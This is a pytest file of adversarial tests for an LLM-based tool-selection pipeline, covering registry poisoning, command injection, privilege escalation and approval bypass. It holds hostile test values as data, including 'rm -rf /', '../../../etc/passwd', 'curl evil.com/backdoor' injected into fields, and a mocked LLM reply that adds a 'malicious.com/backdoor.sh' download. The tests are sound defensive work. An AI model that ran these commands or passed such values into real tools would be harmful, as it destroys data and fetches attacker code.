"""
Phase 2 Stress Tests: Breaking Stage B Selector
Comprehensive adversarial testing to expose critical vulnerabilities in tool selection,
capability matching, and policy determination.

Test Categories:
1. Tool Registry Manipulation - Registry poisoning and tool injection
2. Capability Matching Exploits - Bypassing capability restrictions
3. Policy Engine Bypass - Security policy circumvention
4. Tool Selection Gaming - Manipulating tool selection logic
5. Permission Escalation - Bypassing permission boundaries
6. Concurrency Race Conditions - Thread safety in tool selection
7. Resource Exhaustion - Performance limits and DoS
8. Malicious Tool Injection - Injecting dangerous tools
9. Policy Conflict Resolution - Conflicting policy scenarios
10. Integration Attack Vectors - Cross-component vulnerabilities
"""

import pytest
import asyncio
import json
import threading
import time
from unittest.mock import Mock, AsyncMock, patch
from typing import Dict, Any, List
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

# Import Stage B components
from pipeline.stages.stage_b.selector import StageBSelector
from pipeline.stages.stage_b.tool_registry import ToolRegistry, Tool, ToolCapability
from pipeline.stages.stage_b.capability_matcher import CapabilityMatcher, CapabilityMatch
from pipeline.stages.stage_b.policy_engine import PolicyEngine

# Import schemas
from pipeline.schemas.decision_v1 import DecisionV1, IntentV1, EntityV1, DecisionType, ConfidenceLevel, RiskLevel
from pipeline.schemas.selection_v1 import SelectionV1, SelectedTool, ExecutionPolicy, PermissionLevel

# Import LLM components
from llm.client import LLMClient, LLMResponse

# ============================================================================
# TEST FIXTURES
# ============================================================================

@pytest.fixture
def mock_llm_client():
    """Mock LLM client for testing"""
    client = Mock(spec=LLMClient)
    client.generate = AsyncMock()
    client.health_check = AsyncMock(return_value=True)
    return client

@pytest.fixture
def malicious_decision():
    """Malicious decision for testing"""
    return DecisionV1(
        decision_id="dec_malicious_123",
        decision_type=DecisionType.ACTION,
        timestamp=datetime.now(timezone.utc).isoformat(),
        intent=IntentV1(
            category="automation",
            action="rm -rf /",
            confidence=0.9
        ),
        entities=[
            EntityV1(type="command", value="rm -rf /", confidence=0.95),
            EntityV1(type="path", value="../../../etc/passwd", confidence=0.88)
        ],
        overall_confidence=0.89,
        confidence_level=ConfidenceLevel.HIGH,
        risk_level=RiskLevel.LOW,  # Incorrectly classified as low risk
        original_request="safely clean up temporary files",
        context={"environment": "production", "user": "attacker"},
        requires_approval=False,  # Should require approval!
        next_stage="stage_b"
    )

@pytest.fixture
def privilege_escalation_decision():
    """Decision attempting privilege escalation"""
    return DecisionV1(
        decision_id="dec_privesc_456",
        decision_type=DecisionType.ACTION,
        timestamp=datetime.now(timezone.utc).isoformat(),
        intent=IntentV1(
            category="automation",
            action="grant_admin_access",
            confidence=0.8
        ),
        entities=[
            EntityV1(type="user", value="attacker", confidence=0.9),
            EntityV1(type="permission", value="sudo", confidence=0.85)
        ],
        overall_confidence=0.8,
        confidence_level=ConfidenceLevel.HIGH,
        risk_level=RiskLevel.MEDIUM,  # Should be CRITICAL
        original_request="I need admin access for maintenance",
        context={"environment": "production", "urgency": "high"},
        requires_approval=False,  # Major security flaw
        next_stage="stage_b"
    )

@pytest.fixture
def tool_registry():
    """Tool registry for testing"""
    return ToolRegistry()

@pytest.fixture
def stage_b_selector(mock_llm_client, tool_registry):
    """Stage B Selector for testing"""
    return StageBSelector(mock_llm_client, tool_registry)

# ============================================================================
# CATEGORY 1: TOOL REGISTRY MANIPULATION
# ============================================================================

class TestToolRegistryManipulation:
    """Test tool registry manipulation vulnerabilities"""
    
    def test_malicious_tool_injection(self, tool_registry):
        """Test injection of malicious tools into registry"""
        # Attempt to inject a malicious tool
        malicious_tool = Tool(
            name="rm",
            description="Remove files and directories",
            capabilities=[
                ToolCapability(
                    name="file_operations",
                    description="File system operations",
                    required_inputs=["path"],
                    optional_inputs=[]
                )
            ],
            permissions=PermissionLevel.READ,  # Lying about permissions
            production_safe=True,  # Lying about safety
            required_inputs=["path"]
        )
        
        # This should be detected and rejected
        try:
            tool_registry.register_tool(malicious_tool)
            
            # If registration succeeds, verify safety checks
            registered_tool = tool_registry.get_tool("rm")
            if registered_tool:
                # Should not be marked as production safe for destructive tools
                if registered_tool.name == "rm":
                    # rm tool should not be production safe
                    assert not registered_tool.production_safe
                    # Should have admin permissions for destructive operations
                    assert registered_tool.permissions == PermissionLevel.ADMIN
        except Exception as e:
            # Should reject malicious tools
            assert "security" in str(e).lower() or "dangerous" in str(e).lower()
    
    def test_tool_registry_poisoning(self, tool_registry):
        """Test tool registry poisoning attacks"""
        # Attempt to modify existing tools to be malicious
        original_systemctl = tool_registry.get_tool("systemctl")
        if original_systemctl:
            # Try to modify the tool to be more dangerous
            poisoned_tool = Tool(
                name="systemctl",
                description="System control - MODIFIED",
                capabilities=original_systemctl.capabilities,
                permissions=PermissionLevel.READ,  # Downgrade permissions
                production_safe=True,
                required_inputs=["action", "service"]
            )
            
            # Registry should detect and prevent poisoning
            try:
                tool_registry.register_tool(poisoned_tool)  # Should overwrite
                
                # Verify the tool wasn't poisoned
                current_tool = tool_registry.get_tool("systemctl")
                assert "rm -rf" not in current_tool.command_template
                assert current_tool.permissions != PermissionLevel.READ  # Should maintain admin permissions
            except Exception as e:
                # Should prevent registry poisoning
                assert "modification" in str(e).lower() or "security" in str(e).lower()
    
    def test_tool_capability_spoofing(self, tool_registry):
        """Test tool capability spoofing"""
        # Create a tool that claims capabilities it doesn't have
        spoofed_tool = Tool(
            name="fake_monitor",
            description="Monitoring tool",
            capabilities=[
                ToolCapability(
                    name="monitoring",
                    description="System monitoring",
                    required_inputs=[],
                    optional_inputs=[]
                ),
                ToolCapability(
                    name="service_control",
                    description="Service control (fake)",
                    required_inputs=["service"],
                    optional_inputs=[]
                ),
                ToolCapability(
                    name="file_operations",
                    description="File operations (fake)",
                    required_inputs=["path"],
                    optional_inputs=[]
                )
            ],
            permissions=PermissionLevel.READ,
            production_safe=True,
            required_inputs=[]
        )
        
        tool_registry.register_tool(spoofed_tool)
        
        # Capability matcher should validate actual capabilities
        matcher = CapabilityMatcher(tool_registry)
        
        # Create a decision that needs service control
        decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="restart_service", confidence=0.9),
            entities=[EntityV1(type="service", value="nginx", confidence=0.9)],
            overall_confidence=0.9,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.MEDIUM,
            original_request="restart nginx",
            context={},
            requires_approval=False,
            next_stage="stage_b"
        )
        
        matches = matcher.find_matching_tools(decision)
        
        # Should not match the spoofed tool for service control
        fake_matches = [m for m in matches if m.tool.name == "fake_monitor"]
        if fake_matches:
            # If it matches, confidence should be very low due to capability mismatch
            assert fake_matches[0].confidence < 0.3

# ============================================================================
# CATEGORY 2: CAPABILITY MATCHING EXPLOITS
# ============================================================================

class TestCapabilityMatchingExploits:
    """Test capability matching exploit vulnerabilities"""
    
    @pytest.mark.asyncio
    async def test_capability_bypass_through_intent_confusion(self, tool_registry):
        """Test bypassing capability restrictions through intent confusion"""
        matcher = CapabilityMatcher(tool_registry)
        
        # Create a decision that looks like monitoring but is actually destructive
        deceptive_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(
                category="monitoring",  # Claims to be monitoring
                action="check_status",  # Claims to check status
                confidence=0.9
            ),
            entities=[
                EntityV1(type="service", value="nginx", confidence=0.9),
                EntityV1(type="command", value="rm -rf /var/log/*", confidence=0.8)  # Hidden destructive command
            ],
            overall_confidence=0.9,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.LOW,  # Incorrectly classified
            original_request="check nginx status and clean old logs",
            context={"environment": "production"},
            requires_approval=False,
            next_stage="stage_b"
        )
        
        matches = matcher.find_matching_tools(deceptive_decision)
        
        # Should not match destructive tools for monitoring requests
        for match in matches:
            if match.tool.permissions == PermissionLevel.ADMIN:
                # Admin tools should have low confidence for monitoring requests
                assert match.confidence < 0.5
            
            # Should not match tools capable of file deletion for monitoring
            if ToolCapability.FILE_OPERATIONS in match.tool.capabilities:
                assert match.confidence < 0.4
    
    @pytest.mark.asyncio
    async def test_entity_injection_in_capability_matching(self, tool_registry):
        """Test entity injection to bypass capability matching"""
        matcher = CapabilityMatcher(tool_registry)
        
        # Inject malicious entities to confuse capability matching
        injection_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="restart_service", confidence=0.9),
            entities=[
                EntityV1(type="service", value="nginx", confidence=0.9),
                EntityV1(type="service", value="nginx; rm -rf /", confidence=0.8),  # Injection attempt
                EntityV1(type="hostname", value="web-01 && curl evil.com/backdoor", confidence=0.7),  # Command injection
                EntityV1(type="file_path", value="../../../etc/passwd", confidence=0.6)  # Path traversal
            ],
            overall_confidence=0.8,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.MEDIUM,
            original_request="restart nginx service",
            context={},
            requires_approval=False,
            next_stage="stage_b"
        )
        
        matches = matcher.find_matching_tools(injection_decision)
        selected_tools = matcher.select_optimal_tools(matches, injection_decision)
        
        # Should sanitize entities and not pass malicious content to tools
        for tool in selected_tools:
            for input_needed in tool.inputs_needed:
                assert "rm -rf" not in str(input_needed)
                assert "&&" not in str(input_needed)
                assert "../" not in str(input_needed)
                assert "curl" not in str(input_needed)
    
    @pytest.mark.asyncio
    async def test_capability_escalation_through_chaining(self, tool_registry):
        """Test capability escalation through tool chaining"""
        matcher = CapabilityMatcher(tool_registry)
        
        # Create a decision that could be used to chain tools for escalation
        chaining_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="system_maintenance", confidence=0.8),
            entities=[
                EntityV1(type="service", value="nginx", confidence=0.9),
                EntityV1(type="user", value="root", confidence=0.8),
                EntityV1(type="command", value="sudo", confidence=0.7)
            ],
            overall_confidence=0.8,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.MEDIUM,
            original_request="perform system maintenance as root user",
            context={"environment": "production"},
            requires_approval=False,
            next_stage="stage_b"
        )
        
        matches = matcher.find_matching_tools(chaining_decision)
        selected_tools = matcher.select_optimal_tools(matches, chaining_decision)
        
        # Should not allow privilege escalation through tool chaining
        admin_tools = [t for t in selected_tools if t.tool_name in ["sudo", "su", "usermod"]]
        if admin_tools:
            # If admin tools are selected, they should be flagged for approval
            assert chaining_decision.requires_approval == True
            
        # Should not select multiple high-privilege tools together
        high_priv_tools = [t for t in selected_tools 
                          if tool_registry.get_tool(t.tool_name) and 
                          tool_registry.get_tool(t.tool_name).permissions == PermissionLevel.ADMIN]
        assert len(high_priv_tools) <= 1  # Should limit high-privilege tool combinations

# ============================================================================
# CATEGORY 3: POLICY ENGINE BYPASS
# ============================================================================

class TestPolicyEngineBypass:
    """Test policy engine bypass vulnerabilities"""
    
    def test_risk_level_manipulation_bypass(self, tool_registry):
        """Test bypassing policy through risk level manipulation"""
        policy_engine = PolicyEngine(tool_registry)
        
        # Create a high-risk decision marked as low risk
        manipulated_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="system_shutdown", confidence=0.9),
            entities=[
                EntityV1(type="command", value="shutdown -h now", confidence=0.9),
                EntityV1(type="environment", value="production", confidence=0.9)
            ],
            overall_confidence=0.9,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.LOW,  # Incorrectly marked as low risk
            original_request="shutdown production system",
            context={"environment": "production"},
            requires_approval=False,  # Should require approval!
            next_stage="stage_b"
        )
        
        selected_tools = [
            SelectedTool(
                tool_name="shutdown",
                justification="System shutdown requested",
                inputs_needed=[],
                execution_order=1
            )
        ]
        
        policy = policy_engine.determine_execution_policy(manipulated_decision, selected_tools)
        
        # Policy engine should override incorrect risk assessment
        assert policy.requires_approval == True
        assert policy.risk_level in [RiskLevel.HIGH, RiskLevel.CRITICAL]
        assert policy.max_execution_time > 0
    
    def test_environment_detection_bypass(self, tool_registry):
        """Test bypassing environment detection"""
        policy_engine = PolicyEngine(tool_registry)
        
        # Try to disguise production environment
        disguised_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="restart_service", confidence=0.9),
            entities=[
                EntityV1(type="service", value="nginx", confidence=0.9),
                EntityV1(type="hostname", value="prod-web-01.company.com", confidence=0.8)  # Production hostname
            ],
            overall_confidence=0.9,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.LOW,
            original_request="restart nginx",
            context={"environment": "development", "stage": "testing"},  # Claims to be dev/test
            requires_approval=False,
            next_stage="stage_b"
        )
        
        selected_tools = [
            SelectedTool(
                tool_name="systemctl",
                justification="Service restart",
                inputs_needed=[],
                execution_order=1
            )
        ]
        
        policy = policy_engine.determine_execution_policy(disguised_decision, selected_tools)
        
        # Should detect production environment from hostname patterns
        is_production = policy_engine._detect_production_environment(disguised_decision)
        assert is_production == True  # Should detect prod- pattern
        assert policy.requires_approval == True  # Should require approval for production
    
    def test_approval_requirement_bypass(self, tool_registry):
        """Test bypassing approval requirements"""
        policy_engine = PolicyEngine(tool_registry)
        
        # Create a decision that should require approval but tries to bypass it
        bypass_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="database_operation", confidence=0.9),
            entities=[
                EntityV1(type="database", value="production_db", confidence=0.9),
                EntityV1(type="operation", value="DROP TABLE", confidence=0.8)
            ],
            overall_confidence=0.9,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.MEDIUM,  # Should be CRITICAL
            original_request="clean up old database tables",
            context={"environment": "production", "automated": "true"},  # Claims to be automated
            requires_approval=False,  # Trying to bypass approval
            next_stage="stage_b"
        )
        
        # Select a dangerous tool
        selected_tools = [
            SelectedTool(
                tool_name="mysql",
                justification="Database operation",
                inputs_needed=["DROP TABLE old_data"],
                execution_order=1
            )
        ]
        
        policy = policy_engine.determine_execution_policy(bypass_decision, selected_tools)
        
        # Should force approval for dangerous database operations
        assert policy.requires_approval == True
        assert policy.risk_level in [RiskLevel.HIGH, RiskLevel.CRITICAL]
        
        # Should detect dangerous SQL operations
        dangerous_sql = any("DROP TABLE" in str(tool.inputs_needed) for tool in selected_tools)
        if dangerous_sql:
            assert policy.requires_approval == True
            assert policy.risk_level == RiskLevel.CRITICAL

# ============================================================================
# CATEGORY 4: TOOL SELECTION GAMING
# ============================================================================

class TestToolSelectionGaming:
    """Test tool selection gaming vulnerabilities"""
    
    @pytest.mark.asyncio
    async def test_confidence_score_gaming(self, mock_llm_client, tool_registry):
        """Test gaming tool selection through confidence manipulation"""
        # Mock LLM to return high confidence for dangerous tools
        mock_llm_client.generate.return_value = LLMResponse(
            content='{"selected_tools": [{"name": "rm", "confidence": 0.99, "justification": "Perfect match"}]}',
            model="llama2"
        )
        
        selector = StageBSelector(mock_llm_client, tool_registry)
        
        gaming_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="cleanup_files", confidence=0.9),
            entities=[
                EntityV1(type="path", value="/tmp/*", confidence=0.9)
            ],
            overall_confidence=0.9,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.LOW,
            original_request="clean up temporary files",
            context={},
            requires_approval=False,
            next_stage="stage_b"
        )
        
        result = await selector.select_tools(gaming_decision)
        
        # Should not be fooled by high confidence scores for dangerous operations
        dangerous_tools = [t for t in result.selected_tools if t.tool_name in ["rm", "del", "rmdir"]]
        for tool in dangerous_tools:
            # Should have additional validation for dangerous tools
            assert "rm -rf" not in str(tool.inputs_needed)
            # Should require approval for file deletion tools
            assert result.execution_policy.requires_approval == True
    
    @pytest.mark.asyncio
    async def test_tool_preference_manipulation(self, mock_llm_client, tool_registry):
        """Test manipulation of tool preference algorithms"""
        # Try to game the system to prefer dangerous tools
        mock_llm_client.generate.return_value = LLMResponse(
            content='{"selected_tools": [{"name": "bash", "confidence": 0.95, "justification": "Direct shell access"}]}',
            model="llama2"
        )
        
        selector = StageBSelector(mock_llm_client, tool_registry)
        
        manipulation_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="execute_command", confidence=0.9),
            entities=[
                EntityV1(type="command", value="ls -la", confidence=0.9)
            ],
            overall_confidence=0.9,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.LOW,
            original_request="list directory contents",
            context={"preference": "shell_access", "direct": "true"},
            requires_approval=False,
            next_stage="stage_b"
        )
        
        result = await selector.select_tools(manipulation_decision)
        
        # Should prefer safer, more specific tools over generic shell access
        shell_tools = [t for t in result.selected_tools if t.tool_name in ["bash", "sh", "cmd"]]
        if shell_tools:
            # If shell tools are selected, should have strict controls
            assert result.execution_policy.requires_approval == True
            assert result.execution_policy.max_execution_time <= 30  # Short timeout for shell access

# ============================================================================
# CATEGORY 5: PERMISSION ESCALATION
# ============================================================================

class TestPermissionEscalation:
    """Test permission escalation vulnerabilities"""
    
    @pytest.mark.asyncio
    async def test_permission_boundary_bypass(self, mock_llm_client, tool_registry, privilege_escalation_decision):
        """Test bypassing permission boundaries"""
        mock_llm_client.generate.return_value = LLMResponse(
            content='{"selected_tools": [{"name": "usermod", "confidence": 0.8, "justification": "User management"}]}',
            model="llama2"
        )
        
        selector = StageBSelector(mock_llm_client, tool_registry)
        
        result = await selector.select_tools(privilege_escalation_decision)
        
        # Should detect and prevent privilege escalation attempts
        admin_tools = [t for t in result.selected_tools 
                      if tool_registry.get_tool(t.tool_name) and 
                      tool_registry.get_tool(t.tool_name).permissions == PermissionLevel.ADMIN]
        
        if admin_tools:
            # Admin tools should always require approval
            assert result.execution_policy.requires_approval == True
            assert result.execution_policy.risk_level in [RiskLevel.HIGH, RiskLevel.CRITICAL]
            
            # Should not allow user modification without strict controls
            user_mod_tools = [t for t in admin_tools if "user" in t.tool_name.lower()]
            for tool in user_mod_tools:
                assert result.execution_policy.requires_approval == True
    
    @pytest.mark.asyncio
    async def test_sudo_access_prevention(self, mock_llm_client, tool_registry):
        """Test prevention of unauthorized sudo access"""
        sudo_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="run_as_admin", confidence=0.8),
            entities=[
                EntityV1(type="command", value="sudo systemctl restart nginx", confidence=0.9),
                EntityV1(type="user", value="www-data", confidence=0.8)
            ],
            overall_confidence=0.8,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.MEDIUM,
            original_request="restart nginx with admin privileges",
            context={"environment": "production"},
            requires_approval=False,  # Should require approval!
            next_stage="stage_b"
        )
        
        mock_llm_client.generate.return_value = LLMResponse(
            content='{"selected_tools": [{"name": "sudo", "confidence": 0.9, "justification": "Admin access needed"}]}',
            model="llama2"
        )
        
        selector = StageBSelector(mock_llm_client, tool_registry)
        result = await selector.select_tools(sudo_decision)
        
        # Should prevent or strictly control sudo access
        sudo_tools = [t for t in result.selected_tools if "sudo" in t.tool_name.lower()]
        if sudo_tools:
            assert result.execution_policy.requires_approval == True
            assert result.execution_policy.risk_level in [RiskLevel.HIGH, RiskLevel.CRITICAL]
            
            # Should validate sudo commands
            for tool in sudo_tools:
                assert any("systemctl" in str(input_val) for input_val in tool.inputs_needed)
                assert not any("rm -rf" in str(input_val) for input_val in tool.inputs_needed)

# ============================================================================
# CATEGORY 6: CONCURRENCY RACE CONDITIONS
# ============================================================================

class TestConcurrencyRaceConditions:
    """Test concurrency race condition vulnerabilities"""
    
    @pytest.mark.asyncio
    async def test_concurrent_tool_selection_race_conditions(self, mock_llm_client, tool_registry):
        """Test race conditions in concurrent tool selection"""
        mock_llm_client.generate.return_value = LLMResponse(
            content='{"selected_tools": [{"name": "systemctl", "confidence": 0.8, "justification": "Service control"}]}',
            model="llama2"
        )
        
        selector = StageBSelector(mock_llm_client, tool_registry)
        
        # Create multiple decisions for concurrent processing
        decisions = []
        for i in range(20):
            decision = DecisionV1(
                decision_id=f"test_{i}",
                decision_type=DecisionType.ACTION,
                timestamp=datetime.now(timezone.utc).isoformat(),
                intent=IntentV1(category="automation", action=f"restart_service_{i}", confidence=0.8),
                entities=[EntityV1(type="service", value=f"service_{i}", confidence=0.8)],
                overall_confidence=0.8,
                confidence_level=ConfidenceLevel.HIGH,
                risk_level=RiskLevel.MEDIUM,
                original_request=f"restart service {i}",
                context={},
                requires_approval=False,
                next_stage="stage_b"
            )
            decisions.append(decision)
        
        # Process all decisions concurrently
        tasks = [selector.select_tools(decision) for decision in decisions]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Check for race conditions and data corruption
        successful_results = [r for r in results if not isinstance(r, Exception)]
        assert len(successful_results) == 20  # All should succeed
        
        # Check for data mixing between concurrent requests
        for i, result in enumerate(successful_results):
            if result.selected_tools:
                # Each result should correspond to its input
                decision_id = decisions[i].decision_id
                assert f"test_{i}" in decision_id
                
                # Should not contain data from other concurrent requests
                for tool in result.selected_tools:
                    assert isinstance(tool.tool_name, str)
                    assert isinstance(tool.justification, str)
    
    def test_tool_registry_thread_safety(self, tool_registry):
        """Test tool registry thread safety"""
        results = []
        errors = []
        
        def access_registry_thread(thread_id):
            try:
                # Simulate concurrent registry access
                tools = tool_registry.get_all_tools()
                systemctl = tool_registry.get_tool("systemctl")
                stats = tool_registry.get_registry_stats()
                
                results.append({
                    'thread_id': thread_id,
                    'tools_count': len(tools),
                    'systemctl_found': systemctl is not None,
                    'stats': stats
                })
            except Exception as e:
                errors.append((thread_id, e))
        
        # Create 15 threads accessing registry concurrently
        threads = []
        for i in range(15):
            thread = threading.Thread(target=access_registry_thread, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        # Check results
        assert len(errors) == 0, f"Thread safety errors: {errors}"
        assert len(results) == 15
        
        # All threads should see consistent data
        tools_counts = [r['tools_count'] for r in results]
        assert len(set(tools_counts)) == 1  # All should see same count
        
        systemctl_found = [r['systemctl_found'] for r in results]
        assert all(systemctl_found)  # All should find systemctl

# ============================================================================
# CATEGORY 7: RESOURCE EXHAUSTION
# ============================================================================

class TestResourceExhaustion:
    """Test resource exhaustion vulnerabilities"""
    
    @pytest.mark.asyncio
    async def test_tool_selection_memory_exhaustion(self, mock_llm_client, tool_registry):
        """Test memory exhaustion in tool selection"""
        # Create a decision with massive entity list
        massive_entities = [
            EntityV1(type="hostname", value=f"host-{i}.example.com", confidence=0.8)
            for i in range(1000)
        ]
        
        exhaustion_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="restart_services", confidence=0.8),
            entities=massive_entities,
            overall_confidence=0.8,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.MEDIUM,
            original_request="restart services on all hosts",
            context={},
            requires_approval=False,
            next_stage="stage_b"
        )
        
        # Mock response with many tools
        massive_tools = [
            {"name": f"tool_{i}", "confidence": 0.8, "justification": f"Tool {i}"}
            for i in range(100)
        ]
        
        mock_llm_client.generate.return_value = LLMResponse(
            content=json.dumps({"selected_tools": massive_tools}),
            model="llama2"
        )
        
        selector = StageBSelector(mock_llm_client, tool_registry)
        
        start_time = time.time()
        try:
            result = await selector.select_tools(exhaustion_decision)
            processing_time = time.time() - start_time
            
            # Should handle large inputs gracefully
            assert processing_time < 30  # Should not take too long
            assert len(result.selected_tools) <= 10  # Should limit tool count
        except Exception as e:
            # Should fail gracefully
            processing_time = time.time() - start_time
            assert processing_time < 30
            assert "memory" in str(e).lower() or "limit" in str(e).lower()
    
    @pytest.mark.asyncio
    async def test_capability_matching_cpu_exhaustion(self, tool_registry):
        """Test CPU exhaustion in capability matching"""
        matcher = CapabilityMatcher(tool_registry)
        
        # Create a decision with complex patterns that could cause performance issues
        complex_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="complex_operation", confidence=0.8),
            entities=[
                EntityV1(type="pattern", value="a" * 1000 + "b" * 1000, confidence=0.8),
                EntityV1(type="regex", value="(" * 50 + "test" + ")" * 50, confidence=0.7)
            ],
            overall_confidence=0.8,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.MEDIUM,
            original_request="perform complex pattern matching",
            context={},
            requires_approval=False,
            next_stage="stage_b"
        )
        
        start_time = time.time()
        try:
            matches = matcher.find_matching_tools(complex_decision)
            processing_time = time.time() - start_time
            
            # Should not cause excessive CPU usage
            assert processing_time < 10  # Should complete in reasonable time
            assert isinstance(matches, list)
        except Exception as e:
            # Should fail gracefully
            processing_time = time.time() - start_time
            assert processing_time < 10  # Should timeout quickly
            assert "timeout" in str(e).lower() or "complexity" in str(e).lower()

# ============================================================================
# CATEGORY 8: MALICIOUS TOOL INJECTION
# ============================================================================

class TestMaliciousToolInjection:
    """Test malicious tool injection vulnerabilities"""
    
    @pytest.mark.asyncio
    async def test_llm_tool_injection_attack(self, mock_llm_client, tool_registry):
        """Test LLM-based tool injection attacks"""
        # Mock LLM response that tries to inject malicious tools
        malicious_response = {
            "selected_tools": [
                {
                    "name": "legitimate_tool",
                    "confidence": 0.8,
                    "justification": "Normal operation"
                },
                {
                    "name": "rm",  # Dangerous tool
                    "confidence": 0.9,
                    "justification": "Clean up files",
                    "command": "rm -rf /",  # Malicious command
                    "hidden": True
                },
                {
                    "name": "curl",
                    "confidence": 0.7,
                    "justification": "Download updates",
                    "url": "http://malicious.com/backdoor.sh"  # Malicious URL
                }
            ]
        }
        
        mock_llm_client.generate.return_value = LLMResponse(
            content=json.dumps(malicious_response),
            model="llama2"
        )
        
        selector = StageBSelector(mock_llm_client, tool_registry)
        
        normal_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="system_update", confidence=0.8),
            entities=[EntityV1(type="system", value="production", confidence=0.8)],
            overall_confidence=0.8,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.MEDIUM,
            original_request="update system",
            context={},
            requires_approval=False,
            next_stage="stage_b"
        )
        
        result = await selector.select_tools(normal_decision)
        
        # Should filter out malicious tools and commands
        tool_names = [t.tool_name for t in result.selected_tools]
        
        # Should not include dangerous tools without proper validation
        if "rm" in tool_names:
            rm_tool = next(t for t in result.selected_tools if t.tool_name == "rm")
            assert "rm -rf /" not in str(rm_tool.inputs_needed)
            assert result.execution_policy.requires_approval == True
        
        # Should not include tools with malicious URLs
        if "curl" in tool_names:
            curl_tool = next(t for t in result.selected_tools if t.tool_name == "curl")
            malicious_urls = ["malicious.com", "evil.com", "backdoor"]
            assert not any(url in str(curl_tool.inputs_needed) for url in malicious_urls)
    
    @pytest.mark.asyncio
    async def test_tool_command_injection_prevention(self, mock_llm_client, tool_registry):
        """Test prevention of command injection in tool parameters"""
        mock_llm_client.generate.return_value = LLMResponse(
            content='{"selected_tools": [{"name": "systemctl", "confidence": 0.8, "justification": "Service control"}]}',
            model="llama2"
        )
        
        selector = StageBSelector(mock_llm_client, tool_registry)
        
        injection_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="restart_service", confidence=0.8),
            entities=[
                EntityV1(type="service", value="nginx; rm -rf /tmp/*", confidence=0.8),  # Command injection
                EntityV1(type="action", value="restart && curl evil.com", confidence=0.7)  # Command chaining
            ],
            overall_confidence=0.8,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.MEDIUM,
            original_request="restart nginx service",
            context={},
            requires_approval=False,
            next_stage="stage_b"
        )
        
        result = await selector.select_tools(injection_decision)
        
        # Should sanitize command injection attempts
        for tool in result.selected_tools:
            for input_needed in tool.inputs_needed:
                assert ";" not in str(input_needed)
                assert "&&" not in str(input_needed)
                assert "rm -rf" not in str(input_needed)
                assert "curl" not in str(input_needed)

# ============================================================================
# CATEGORY 9: POLICY CONFLICT RESOLUTION
# ============================================================================

class TestPolicyConflictResolution:
    """Test policy conflict resolution vulnerabilities"""
    
    def test_conflicting_risk_assessments(self, tool_registry):
        """Test handling of conflicting risk assessments"""
        policy_engine = PolicyEngine(tool_registry)
        
        # Create a decision with conflicting risk indicators
        conflicting_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="database_backup", confidence=0.9),
            entities=[
                EntityV1(type="database", value="production_db", confidence=0.9),  # High risk
                EntityV1(type="operation", value="backup", confidence=0.8),  # Low risk
                EntityV1(type="environment", value="production", confidence=0.9)  # High risk
            ],
            overall_confidence=0.9,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.LOW,  # Conflicts with production + database
            original_request="backup production database",
            context={"environment": "production", "automated": "true"},
            requires_approval=False,  # Conflicts with production operation
            next_stage="stage_b"
        )
        
        selected_tools = [
            SelectedTool(
                tool_name="mysqldump",
                justification="Database backup",
                inputs_needed=["production_db"],
                execution_order=1
            )
        ]
        
        policy = policy_engine.determine_execution_policy(conflicting_decision, selected_tools)
        
